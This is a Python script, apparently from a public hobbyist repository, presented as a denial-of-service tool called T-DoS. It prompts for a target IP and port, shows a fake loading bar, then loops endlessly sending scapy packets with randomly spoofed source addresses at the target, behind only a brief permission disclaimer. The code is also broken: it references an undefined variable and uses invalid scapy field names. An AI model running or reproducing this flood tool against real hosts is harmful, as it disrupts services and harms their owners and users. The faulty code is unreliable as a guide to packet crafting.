print("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
from scapy.all import *
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet T-DoS")
print("Coded By : ParzivalHack")
print("Github   : github.com/ParzivalHack")
print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
print("Use this tool only on your own website or websites from which you have obtained permission.")
print("License: The source code of this tool is under the MIT License. © 2022 Tommaso Bona")
print()
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Port Number of Target(Suggested 80/tcp or 443/tcp):"))
i = 1
os.system("clear")
print("\033[91m")
os.system("figlet DoS Attack")
print("Coded by: ParzivalHack")
print ("\033[91m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(4)
print("[==========          ] 50%")
time.sleep(3)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)
sent = 0
while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = (".")
   
   Source_ip = a + dot + b + dot + c + dot + d
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt,inter = .001)
   print ("packet sent ", i)
   i = i + 1
   
